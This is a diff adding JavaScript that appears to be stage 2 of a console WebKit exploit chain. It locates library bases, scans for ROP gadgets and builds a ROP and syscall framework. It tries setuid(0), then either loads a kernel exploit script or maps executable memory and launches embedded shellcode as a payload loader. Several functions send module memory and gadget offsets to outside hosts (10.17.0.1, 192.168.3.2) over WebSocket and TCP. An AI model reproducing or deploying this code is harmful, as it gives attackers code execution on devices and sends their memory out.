@@ -1,0 +1,720 @@
+/*
+ Stage 2:
+ - Stage 2 goes from read/write to code execution
+ */
+var print = function(string) { // like log but html
+    document.getElementById("console").innerHTML += string + "\n";
+}
+var p;
+var xhr_sync_log = function(str) {
+    var req = new XMLHttpRequest();
+    req.open('GET', "log?" + str, false);
+    try {
+        req.send();
+    } catch(e){}
+}
+
+window.printdump = function(a,b) {
+    print(hexdump(new int64(a,b), 96));
+}
+
+var hexdump = function(address, size) {
+    var ret = "\nHex Dump of 0x" + address + ": \n";
+    var addr_copy = address.add32(0);
+    for (var i = 0; i < size/8; i++) {
+        var rd = p.read8(addr_copy.add32(i*8));
+        ret += "<a href='javascript:window.printdump(" + rd.low.toString() + ", " + rd.hi.toString() + ")'>0x" + rd.toString(16) + "</a>\n";
+    }
+    
+    return ret;
+};
+
+var findModuleBaseXHR = function(addr) {
+    var addr_ = addr.add32(0); // copy
+    addr_.low &= 0xFFFFF000;
+    xhr_sync_log("START: " + addr_);
+    
+    while (1) {
+        var vr = p.read4(addr_.add32(0x110-4));
+        xhr_sync_log("step" + addr_);
+        addr_.sub32inplace(0x1000);
+    }
+}
+
+var dumpModuleXHR = function(moduleBase) {
+    var chunk = new ArrayBuffer(0x1000);
+    var chunk32 = new Uint32Array(chunk);
+    var chunk8 = new Uint8Array(chunk);
+    connection = new WebSocket('ws://10.17.0.1:8080');
+    connection.binaryType = "arraybuffer";
+    var helo = new Uint32Array(1);
+    helo[0] = 0x41414141;
+    
+    var moduleBase_ = moduleBase.add32(0);
+    connection.onmessage = function() {
+        try {
+            for (var i = 0; i < chunk32.length; i++) {
+                var val = p.read4(moduleBase_);
+                chunk32[i] = val;
+                moduleBase_.add32inplace(4);
+            }
+            connection.send(chunk8);
+        } catch (e) {
+            print(e);
+        }
+    }
+}
+
+var get_jmptgt = function(addr) {
+    var z=p.read4(addr) & 0xFFFF;
+    var y=p.read4(addr.add32(2));
+    if (z != 0x25ff) return 0;
+    
+    return addr.add32(y+6);
+}
+
+var gadgets;
+
+var gadgetcache = 0;
+gadgetcache = {
+    "ret": 0x3c,
+    "ep": 0xad,
+    "pop rbp": 0xb6,
+    "pop rax": 0x43f5,
+    "mov rax, rdi": 0x58d0,
+    "pop r8": 0x179c5,
+    "pop rsp": 0x1e687,
+    "mov [rdi], rsi": 0x23ac2,
+    "pop rdi": 0x38dba,
+    "pop rcx": 0x52e59,
+    "pop rsi": 0x8f38a,
+    "jop": 0xc37d0,
+    "pop rdx": 0xdedc2,
+    "mov [rax], rsi": 0x2565a7,
+    "pop r9": 0xbb30cf,
+    "mov [rdi], rax": 0x14536B,
+    "infloop": 0x151efca,
+};
+
+/* 
+ Gadget scanning is optimized to only look for stuff that ends with 0xc3. So we define a special case for the JOP gadget used.
+ */
+var gadgetmap_wk = {
+    "ep": [0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x5d, 0xc3],
+    "pop rsi": [0x5e, 0xc3],
+    "pop rdi": [0x5f, 0xc3],
+    "pop rsp": [0x5c, 0xc3],
+    "pop rax": [0x58, 0xc3],
+    "pop rdx": [0x5a, 0xc3],
+    "pop rcx": [0x59, 0xc3],
+    "pop rsp": [0x5c, 0xc3],
+    "pop rbp": [0x5d, 0xc3],
+    "pop r8": [0x47, 0x58, 0xc3],
+    "pop r9": [0x47, 0x59, 0xc3],
+    "infloop": [0xeb, 0xfe, 0xc3],
+    "ret": [0xc3],
+    "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xc3],
+    "mov [rax], rsi": [0x48, 0x89, 0x30, 0xc3],
+    "mov [rdi], rax": [0x48, 0x89, 0x07, 0xc3],
+    "mov rax, rdi": [0x48, 0x89, 0xf8, 0xc3]
+};
+var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
+slowpath_jop.reverse();
+
+var reenter_help = {
+    length: {
+        valueOf: function () {
+            return 0;
+        }
+    }
+};
+
+var gadgetoffs = {}
+var print = function(string) { // like log but html
+    document.getElementById("console").innerHTML += string + "\n";
+}
+var log = function(string) {
+    document.getElementById("console").innerHTML += escapeHtml(string) + "\n";
+}
+
+window.postprim = function() {
+    window.onerror = function(e) {
+        document.getElementById("console").innerHTML += "Error caught by global context: "+e+"\n";
+    };
+    print ("[+] exploit succeeded");
+    print ("--- welcome to stage2 ---");
+
+    p=window.primitives;
+
+    p.leakfunc = function(func) {
+        var fptr_store = p.leakval(func);
+        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
+    }
+    gadgetconn = 0;
+    if (!gadgetcache)
+        gadgetconn = new WebSocket('ws://10.17.0.1:8080');
+    
+    var parseFloatStore = p.leakfunc(parseFloat);
+    var parseFloatPtr = p.read8(parseFloatStore);
+    print("parseFloat at: 0x" + parseFloatPtr);
+    var webKitBase = p.read8(parseFloatStore);
+    window.webKitBase = webKitBase;
+    
+    webKitBase.low &= 0xfffff000;
+    webKitBase.sub32inplace(0x59c000-0x24000);
+    print("libwebkit base at: 0x" + webKitBase);
+
+    var o2wk = function(o) {
+        return webKitBase.add32(o);
+    }
+    gadgets = {
+        "stack_chk_fail": o2wk(0xc8),
+        "memset": o2wk(0x228),
+        "setjmp": o2wk(0x14f8)
+    };
+    var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets.memset));
+    libSceLibcInternalBase.low &= ~0x3FFF;
+    libSceLibcInternalBase.sub32inplace(0x20000);
+    print("libSceLibcInternal: 0x" + libSceLibcInternalBase.toString());
+
+    var libKernelBase = p.read8(get_jmptgt(gadgets.stack_chk_fail));
+    window.libKernelBase = libKernelBase;
+    libKernelBase.low &= 0xfffff000;
+    libKernelBase.sub32inplace(0xd000+0x4000);
+    print("libkernel_web base at: 0x" + libKernelBase);
+    
+    gadgets.sceKernelAddReadEvent = libKernelBase.add32(0xdf0)
+    var o2lk = function(o) {
+        return libKernelBase.add32(o);
+    }
+    
+    var wkview = new Uint8Array(0x1000);
+    var wkstr = p.leakval(wkview).add32(0x10);
+    var orig_wkview_buf = p.read8(wkstr);
+    
+    p.write8(wkstr, webKitBase);
+    p.write4(wkstr.add32(8), 0x367c000);
+    
+    var gadgets_to_find = 0;
+    var gadgetnames = [];
+    for (var gadgetname in gadgetmap_wk) {
+        if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
+            gadgets_to_find++;
+            gadgetnames.push(gadgetname);
+            gadgetmap_wk[gadgetname].reverse();
+        }
+    }
+    log("finding gadgets");
+    
+    gadgets_to_find++; // slowpath_jop
+    
+    var findgadget = function(donecb) {
+        if (gadgetcache) {
+            gadgets_to_find=0;
+            slowpath_jop=0;
+            log("using cached gadgets");
+            
+            for (var gadgetname in gadgetcache) {
+                if (gadgetcache.hasOwnProperty(gadgetname)) {
+                    gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
+                }
+            }
+            
+        } else {
+            for (var i=0; i < wkview.length; i++) {
+                if (wkview[i] == 0xc3) {
+                    for (var nl = 0; nl < gadgetnames.length; nl++) {
+                        var found = 1;
+                        if (!gadgetnames[nl]) continue;
+                        var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
+                        for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
+                            if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
+                                found = 0;
+                                break;
+                            }
+                        }
+                        if (!found) continue;
+                        gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
+                        gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
+                        delete gadgetnames[nl];
+                        gadgets_to_find--;
+                    }
+                } else if (wkview[i] == 0xe0 && wkview[i-1] == 0xff && slowpath_jop) {
+                    var found = 1;
+                    for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
+                        if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
+                            found = 0;
+                            break;
+                        }
+                    }
+                    if (!found) continue;
+                    gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
+                    gadgetoffs["jop"] = i - slowpath_jop.length + 1;
+                    gadgets_to_find--;
+                    slowpath_jop = 0;
+                }
+                
+                if (!gadgets_to_find) break;
+            }
+        }
+        if (!gadgets_to_find && !slowpath_jop) {
+            log("found gadgets");
+            if (gadgetconn)
+                gadgetconn.onopen = function(e) {
+                    gadgetconn.send(JSON.stringify(gadgetoffs));
+                }
+            setTimeout(donecb, 50);
+        } else {
+            log("missing gadgets: ");
+            for (var nl in gadgetnames) {
+                log(" - " + gadgetnames[nl]);
+            }
+            if (slowpath_jop) log(" - jop gadget");
+        }
+    }
+    findgadget(function(){});
+    var hold1;
+    var hold2;
+    var holdz;
+    var holdz1;
+    
+    while (1) {
+        hold1 = {a:0, b:0, c:0, d:0};
+        hold2 = {a:0, b:0, c:0, d:0};
+        holdz1 = p.leakval(hold2);
+        holdz = p.leakval(hold1);
+        if (holdz.low - 0x30 == holdz1.low) break;
+    }
+    
+    var pushframe = [];
+    pushframe.length = 0x80;
+    var funcbuf;
+    
+    var launch_chain = function(chain) {
+        var stackPointer = 0;
+        var stackCookie = 0;
+        var orig_reenter_rip = 0;
+        
+        var reenter_help = {length: { valueOf: function() {
+            orig_reenter_rip = p.read8(stackPointer);
+            stackCookie = p.read8(stackPointer.add32(8));
+            var returnToFrame = stackPointer;
+            
+            var ocnt = chain.count;
+            chain.push_write8(stackPointer, orig_reenter_rip);
+            chain.push_write8(stackPointer.add32(8), stackCookie);
+            
+            if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
+            
+            chain.push(gadgets["pop rsp"]); // pop rsp
+            chain.push(returnToFrame); // -> back to the trap life
+            chain.count = ocnt;
+            
+            p.write8(stackPointer, (gadgets["pop rsp"])); // pop rsp
+            p.write8(stackPointer.add32(8), chain.ropframeptr); // -> rop frame
+        }}};
+        
+        var funcbuf32 = new Uint32Array(0x100);
+        nogc.push(funcbuf32);
+        funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));
+        
+        p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
+        p.write8(funcbuf.add32(0x80), gadgets["jop"]);
+        p.write8(funcbuf,funcbuf);
+        p.write8(parseFloatStore, gadgets["jop"]);
+        var orig_hold = p.read8(holdz1);
+        var orig_hold48 = p.read8(holdz1.add32(0x48));
+        
+        p.write8(holdz1, funcbuf.add32(0x50));
+        p.write8(holdz1.add32(0x48), funcbuf);
+        parseFloat(hold2,hold2,hold2,hold2,hold2,hold2);
+        p.write8(holdz1, orig_hold);
+        p.write8(holdz1.add32(0x48), orig_hold48);
+        
+        stackPointer = p.read8(funcbuf.add32(0x10));
+        rtv=Array.prototype.splice.apply(reenter_help);
+        return p.leakval(rtv);
+    }
+    
+    gadgets = gadgets;
+    p.loadchain = launch_chain;
+    window.RopChain = function () {
+        this.ropframe = new Uint32Array(0x10000);
+        this.ropframeptr = p.read8(p.leakval(this.ropframe).add32(0x10));
+        this.count = 0;
+        this.clear = function() {
+            this.count = 0;
+            this.runtime = undefined;
+            for (var i = 0; i < 0xff0/2; i++) {
+                p.write8(this.ropframeptr.add32(i*8), 0);
+            }
+        };
+        this.pushSymbolic = function() {
+            this.count++;
+            return this.count-1;
+        }
+        this.finalizeSymbolic = function(idx, val) {
+            p.write8(this.ropframeptr.add32(idx*8), val);
+        }
+        this.push = function(val) {
+            this.finalizeSymbolic(this.pushSymbolic(), val);
+        }
+        this.push_write8 = function(where, what) {
+            this.push(gadgets["pop rdi"]); // pop rdi
+            this.push(where); // where
+            this.push(gadgets["pop rsi"]); // pop rsi
+            this.push(what); // what
+            this.push(gadgets["mov [rdi], rsi"]); // perform write
+        }
+        this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
+            this.push(gadgets["pop rdi"]); // pop rdi
+            this.push(rdi); // what
+            this.push(gadgets["pop rsi"]); // pop rsi
+            this.push(rsi); // what
+            this.push(gadgets["pop rdx"]); // pop rdx
+            this.push(rdx); // what
+            this.push(gadgets["pop rcx"]); // pop r10
+            this.push(rcx); // what
+            this.push(gadgets["pop r8"]); // pop r8
+            this.push(r8); // what
+            this.push(gadgets["pop r9"]); // pop r9
+            this.push(r9); // what
+            this.push(rip); // jmp
+            return this;
+        }
+        
+        this.run = function() {
+            var retv = p.loadchain(this, this.notimes);
+            this.clear();
+            return retv;
+        }
+        
+        return this;
+    };
+    
+    var RopChain = window.RopChain();
+    window.syscallnames = {"sys_exit": 1,"fork": 2,"read": 3,"write": 4,"open": 5,"close": 6,"wait4": 7,"unlink": 10,"chdir": 12,"chmod": 15,"getpid": 20,"setuid": 23,"getuid": 24,"geteuid": 25,"recvmsg": 27,"sendmsg": 28,"recvfrom": 29,"accept": 30,"getpeername": 31,"getsockname": 32,"access": 33,"chflags": 34,"fchflags": 35,"sync": 36,"kill": 37,"getppid": 39,"dup": 41,"pipe": 42,"getegid": 43,"profil": 44,"getgid": 47,"getlogin": 49,"setlogin": 50,"sigaltstack": 53,"ioctl": 54,"reboot": 55,"revoke": 56,"execve": 59,"execve": 59,"msync": 65,"munmap": 73,"mprotect": 74,"madvise": 75,"mincore": 78,"getgroups": 79,"setgroups": 80,"setitimer": 83,"getitimer": 86,"getdtablesize": 89,"dup2": 90,"fcntl": 92,"select": 93,"fsync": 95,"setpriority": 96,"socket": 97,"connect": 98,"accept": 99,"getpriority": 100,"send": 101,"recv": 102,"bind": 104,"setsockopt": 105,"listen": 106,"recvmsg": 113,"sendmsg": 114,"gettimeofday": 116,"getrusage": 117,"getsockopt": 118,"readv": 120,"writev": 121,"settimeofday": 122,"fchmod": 124,"recvfrom": 125,"setreuid": 126,"setregid": 127,"rename": 128,"flock": 131,"sendto": 133,"shutdown": 134,"socketpair": 135,"mkdir": 136,"rmdir": 137,"utimes": 138,"adjtime": 140,"getpeername": 141,"setsid": 147,"sysarch": 165,"setegid": 182,"seteuid": 183,"stat": 188,"fstat": 189,"lstat": 190,"pathconf": 191,"fpathconf": 192,"getrlimit": 194,"setrlimit": 195,"getdirentries": 196,"__sysctl": 202,"mlock": 203,"munlock": 204,"futimes": 206,"poll": 209,"clock_gettime": 232,"clock_settime": 233,"clock_getres": 234,"ktimer_create": 235,"ktimer_delete": 236,"ktimer_settime": 237,"ktimer_gettime": 238,"ktimer_getoverrun": 239,"nanosleep": 240,"rfork": 251,"issetugid": 253,"getdents": 272,"preadv": 289,"pwritev": 290,"getsid": 310,"aio_suspend": 315,"mlockall": 324,"munlockall": 325,"sched_setparam": 327,"sched_getparam": 328,"sched_setscheduler": 329,"sched_getscheduler": 330,"sched_yield": 331,"sched_get_priority_max": 332,"sched_get_priority_min": 333,"sched_rr_get_interval": 334,"sigprocmask": 340,"sigprocmask": 340,"sigsuspend": 341,"sigpending": 343,"sigtimedwait": 345,"sigwaitinfo": 346,"kqueue": 362,"kevent": 363,"uuidgen": 392,"sendfile": 393,"fstatfs": 397,"ksem_close": 400,"ksem_post": 401,"ksem_wait": 402,"ksem_trywait": 403,"ksem_init": 404,"ksem_open": 405,"ksem_unlink": 406,"ksem_getvalue": 407,"ksem_destroy": 408,"sigaction": 416,"sigreturn": 417,"getcontext": 421,"setcontext": 422,"swapcontext": 423,"sigwait": 429,"thr_create": 430,"thr_exit": 431,"thr_self": 432,"thr_kill": 433,"ksem_timedwait": 441,"thr_suspend": 442,"thr_wake": 443,"kldunloadf": 444,"_umtx_op": 454,"_umtx_op": 454,"thr_new": 455,"sigqueue": 456,"thr_set_name": 464,"rtprio_thread": 466,"pread": 475,"pwrite": 476,"mmap": 477,"lseek": 478,"truncate": 479,"ftruncate": 480,"thr_kill2": 481,"shm_open": 482,"shm_unlink": 483,"cpuset_getid": 486,"cpuset_getaffinity": 487,"cpuset_setaffinity": 488,"openat": 499,"mdbg_service": 601}
+    
+    function swapkeyval(json) {
+        var ret = {};
+        for (var key in json) {
+            if (json.hasOwnProperty(key)) {
+                ret[json[key]] = key;
+            }
+        }
+        return ret;
+    }
+    
+    window.nameforsyscall = swapkeyval(window.syscallnames);
+    
+    window.syscalls = {};
+    
+    log("--- welcome to stage3 ---");
+    
+    var kview = new Uint8Array(0x1000);
+    var kstr = p.leakval(kview).add32(0x10);
+    var orig_kview_buf = p.read8(kstr);
+    
+    p.write8(kstr, window.libKernelBase);
+    p.write4(kstr.add32(8), 0x40000); // high enough lel
+    
+    var countbytes;
+    for (var i = 0; i < 0x40000; i++) {
+        if (kview[i] == 0x72 && kview[i+1] == 0x64 && kview[i+2] == 0x6c && kview[i+3] == 0x6f && kview[i+4] == 0x63) {
+            countbytes = i;
+            break;
+        }
+    }
+    p.write4(kstr.add32(8), countbytes + 32);
+    
+    var dview32 = new Uint32Array(1);
+    var dview8 = new Uint8Array(dview32.buffer);
+    for (var i = 0; i < countbytes; i++) {
+        if (kview[i] == 0x48 && kview[i+1] == 0xc7 && kview[i+2] == 0xc0 && kview[i+7] == 0x49 && kview[i+8] == 0x89 && kview[i+9] == 0xca && kview[i+10] == 0x0f && kview[i+11] == 0x05) {
+            dview8[0] = kview[i+3];
+            dview8[1] = kview[i+4];
+            dview8[2] = kview[i+5];
+            dview8[3] = kview[i+6];
+            var syscallno = dview32[0];
+            window.syscalls[syscallno] = window.libKernelBase.add32(i);
+        }
+    }
+    var chain = new window.RopChain;
+    var returnvalue;
+    p.fcall_ = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+        chain.clear();
+        
+        chain.notimes = this.next_notime;
+        this.next_notime = 1;
+
+        chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
+        
+        chain.push(window.gadgets["pop rdi"]); // pop rdi
+        chain.push(chain.ropframeptr.add32(0x3ff8)); // where
+        chain.push(window.gadgets["mov [rdi], rax"]); // rdi = rax
+        
+        chain.push(window.gadgets["pop rax"]); // pop rax
+        chain.push(p.leakval(0x41414242)); // where
+        
+        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
+        returnvalue = p.read8(chain.ropframeptr.add32(0x3ff8)); //p.read8(chain.ropframeptr.add32(0x3ff8));
+    }
+    p.fcall = function() {
+        var rv=p.fcall_.apply(this,arguments);
+        return returnvalue;
+    }
+    p.readstr = function(addr) {
+        var addr_ = addr.add32(0); // copy
+        var rd = p.read4(addr_);
+        var buf = "";
+        while (rd & 0xFF) {
+            buf += String.fromCharCode(rd & 0xFF);
+            addr_.add32inplace(1);
+            rd = p.read4(addr_);
+        }
+        return buf;
+    }
+    
+    p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
+        if (typeof sysc == "string") {
+            sysc = window.syscallnames[sysc];
+        }
+        if (typeof sysc != "number") {
+            throw new Error("invalid syscall");
+        }
+        
+        var off = window.syscalls[sysc];
+        if (off == undefined) {
+            throw new Error("invalid syscall");
+        }
+        
+        return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
+    }
+    p.sptr = function(str) {
+        var bufView = new Uint8Array(str.length+1);
+        for (var i=0; i<str.length; i++) {
+            bufView[i] = str.charCodeAt(i) & 0xFF;
+        }
+        window.nogc.push(bufView);
+        return p.read8(p.leakval(bufView).add32(0x10));
+    };
+    
+    function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
+    function malloc32(sz) {
+        var backing = new Uint8Array(0x10000 + sz * 4);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = new Uint32Array(backing.buffer);
+        return ptr;
+    }
+    function pfd(addr) {
+        var page = addr.add32(0);
+        page.low &= 0xffffc000;
+        p.syscall("mlock", page, 0x8000);
+        p.read4(addr);
+        return addr;
+    }
+    var spawnthread = function (name, chain) {
+        /*
+         seg000:00000000007FA7D0                         sub_7FA7D0      proc near               ; DATA XREF: sub_7F8330+5Eo
+         seg000:00000000007FA7D0 55                                      push    rbp
+         seg000:00000000007FA7D1 48 89 E5                                mov     rbp, rsp
+         seg000:00000000007FA7D4 41 56                                   push    r14
+         seg000:00000000007FA7D6 53                                      push    rbx
+         seg000:00000000007FA7D7 48 89 F3                                mov     rbx, rsi
+         seg000:00000000007FA7DA 49 89 FE                                mov     r14, rdi
+         seg000:00000000007FA7DD 48 8D 35 E5 B3 EC 00                    lea     rsi, aMissingPlteBef ; "Missing PLTE before tRNS"
+         -> xref:
+         
+         seg000:00000000007F8380 48 8D 3D 28 D8 EC 00                    lea     rdi, a1_5_18_0  ; "1.5.18"
+         seg000:00000000007F8387 48 8D 15 82 23 00 00                    lea     rdx, sub_7FA710
+         seg000:00000000007F838E 48 8D 0D 3B 24 00 00                    lea     rcx, sub_7FA7D0
+         seg000:00000000007F8395 31 F6                                   xor     esi, esi
+         seg000:00000000007F8397 49 C7 47 20 00 00 00 00                 mov     qword ptr [r15+20h], 0
+         seg000:00000000007F839F 66 41 C7 47 18 00 00                    mov     word ptr [r15+18h], 0
+         seg000:00000000007F83A6 49 C7 47 10 00 00 00 00                 mov     qword ptr [r15+10h], 0
+         seg000:00000000007F83AE E8 8D 3C D3 00                          call    sub_152C040
+         -> code:
+         
+         m_png = png_create_read_struct(PNG_LIBPNG_VER_STRING, 0, decodingFailed, decodingWarning);
+         
+         decodingWarning -> contains Missing PLTE before tRNS
+         
+         decodingFailed -> contains longjmp
+         
+         seg000:00000000007FA710                         sub_7FA710      proc near               ; DATA XREF: sub_7F8330+57o
+         seg000:00000000007FA710                                                                 ; sub_7F9DC0+2Eo
+         seg000:00000000007FA710 55                                      push    rbp
+         seg000:00000000007FA711 48 89 E5                                mov     rbp, rsp
+         seg000:00000000007FA714 48 8B 35 5D B6 E5 02                    mov     rsi, cs:qword_3655D78
+         seg000:00000000007FA71B BA 60 00 00 00                          mov     edx, 60h ; '`'
+         seg000:00000000007FA720 E8 AB E6 D2 00                          call    sub_1528DD0
+         seg000:00000000007FA725 BE 01 00 00 00                          mov     esi, 1
+         seg000:00000000007FA72A 48 89 C7                                mov     rdi, rax
+         seg000:00000000007FA72D E8 26 6D 80 FF                          call    sub_1458 < longjmp
+         seg000:00000000007FA732 0F 0B                                   ud2
+         seg000:00000000007FA732                         sub_7FA710      endp
+         
+         
+         */
+        var longjmp = window.webKitBase.add32(0x14e8);
+
+        // ThreadIdentifier createThread(ThreadFunction entryPoint, void* data, const char* name)
+        /*
+         seg000:00000000001DD17F 48 8D 15 C9 38 4C 01                    lea     rdx, aWebcoreGccontr ; "WebCore: GCController"
+         seg000:00000000001DD186 31 F6                                   xor     esi, esi
+         seg000:00000000001DD188 E8 B3 1B F9 00                          call    sub_116ED40
+         */
+
+        var createThread = window.webKitBase.add32(0x779190);
+
+        var contextp = malloc32(0x2000);
+        var contextz = contextp.backing;
+        contextz[0] = 1337;
+
+        var thread2 = new window.RopChain();
+        thread2.push(window.gadgets["ret"]); // nop
+        thread2.push(window.gadgets["ret"]); // nop
+        thread2.push(window.gadgets["ret"]); // nop
+        thread2.push(window.gadgets["ret"]); // nop
+        chain(thread2);
+
+        p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
+        p.write8(contextp.add32(0x10), thread2.ropframeptr); // rsp
+        p.fcall(createThread, longjmp, contextp, p.sptr(name));
+
+        window.nogc.push(contextz);
+        window.nogc.push(thread2);
+
+        return thread2;
+    }
+
+
+    /* CMX: Start */
+    p.socket = function () {
+        return p.syscall('socket', 2, 1, 0); // 2 = AF_INET, 1 = SOCK_STREAM, 0 = TCP
+    }
+    p.connect = function (s, ip, port) {
+        var sockAddr = new Uint32Array(0x10);
+        var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(0x10));
+        var ipSegments = ip.split('.');
+        for (var seg = 0; seg < 4; seg++) {
+            ipSegments[seg] = parseInt(ipSegments[seg]);
+        }
+        sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
+        sockAddr[1] = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
+        sockAddr[2] = 0;
+        sockAddr[3] = 0;
+        return p.syscall('connect', s, sockAddrPtr, 0x10);
+    }
+    p.writeSocket = function (s, data, size) {
+        return p.syscall('write', s, data, size);
+    }
+    p.closeSocket = function (s) {
+        return p.syscall('close', s);
+    }
+    window.dumpMemory = function (addr, size) {
+        var s = p.socket();
+        if (p.connect(s, '192.168.3.2', 9023) != 0) {
+            // failed
+            alert('failed to connect');
+            return -1;
+        }
+        p.writeSocket(s, addr, size);
+        p.closeSocket(s);
+    }
+    /* CMX: End */
+
+    log("loaded sycalls");
+
+    var rtv = p.fcall(window.gadgets["mov rax, rdi"], 0x41414141);
+    nogc.push(rtv); // for some reason this gets corrupted. leaking ref.
+    
+    var rtv1 = p.fcall(window.gadgets["mov rax, rdi"], 0x41414141);
+    var pid = p.syscall("getpid");
+    var uid = p.syscall("getuid");
+    print("all good. fcall test retval = " + rtv1 + " - uid: " + uid + " - pid: " + pid);
+    
+    // test syscall
+    var test = p.syscall("setuid", 0);
+    if (test != '0') {
+        // run kernel exploit
+        sc = document.createElement("script");
+        sc.src = "kern.js";
+        document.body.appendChild(sc);
+    } else {
+        // create loader memory
+        log("=== Loader ===");
+        var code_addr = new int64(0x26100000, 0x00000009);
+        var buffer = p.syscall("mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
+
+        // verify loaded
+        if (buffer == '926100000') {
+            /*var interrupt1;
+
+            // sys_mdbg_service(8, 0, 0);
+            spawnthread("GottaGoFast", function (thread2) {
+                interrupt1 = thread2.ropframeptr;
+                thread2.push(window.gadgets["pop rdi"]);
+                thread2.push(code_addr);
+                thread2.push(window.gadgets["pop rax"]);
+                thread2.push(0xC0DE0000);
+                thread2.push(window.gadgets["mov [rdi], rax"]);
+
+                thread2.push(window.gadgets["pop rdi"]); // pop rdi
+                thread2.push(8); // what
+                thread2.push(window.gadgets["pop rsi"]); // pop rsi
+                thread2.push(0); // what
+                thread2.push(window.gadgets["pop rdx"]); // pop rdx
+                thread2.push(0); // what
+                thread2.push(window.gadgets["pop rsp"]); // pop rsp
+                thread2.push(thread2.ropframeptr.add32(0x800)); // what
+                thread2.count = 0x100;
+                var cntr = thread2.count;
+                thread2.push(window.syscalls[601]); // mdbg_service
+                thread2.push_write8(thread2.ropframeptr.add32(cntr * 8), window.syscalls[601]); // restore
+                thread2.push(window.gadgets["pop rsp"]); // pop rdx
+                thread2.push(thread2.ropframeptr); // what
+            });
+
+            // start the thread
+            print("Thread running.");*/
+
+            // sys_mdbg_service(28, 0, inBuff);
+            /*var inBuff = malloc(0x20);
+            p.write8(inBuff.add32(0x00), 0);
+            p.write8(inBuff.add32(0x08), 0);
+            p.write8(inBuff.add32(0x10), 0);
+            p.write8(inBuff.add32(0x18), 0);
+            var result = p.syscall("mdbg_service", 28, 0, inBuff);
+            print("result: 0x" + result.toString(16));*/
+
+            // build loader
+            var createThread = window.webKitBase.add32(0x779190);
+            var shellbuf = malloc32(0x1000);
+            var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
+            for (var i = 0; i < shcode.length; i++) {
+                shellbuf.backing[i] = shcode[i];
+            }
+            p.syscall("mprotect", shellbuf, 0x4000, 7);
+            pfd(shellbuf);
+
+            // launch loader
+            p.fcall(createThread, shellbuf, 0, p.sptr("loader"));
+            print("Waiting for payload ...");
+        }
+    }
+
+    // finished
+    log("Finished.");
+
+    dgc();
+    dgc();
+}
+if (window.primitives) window.postprim(window.primitives)
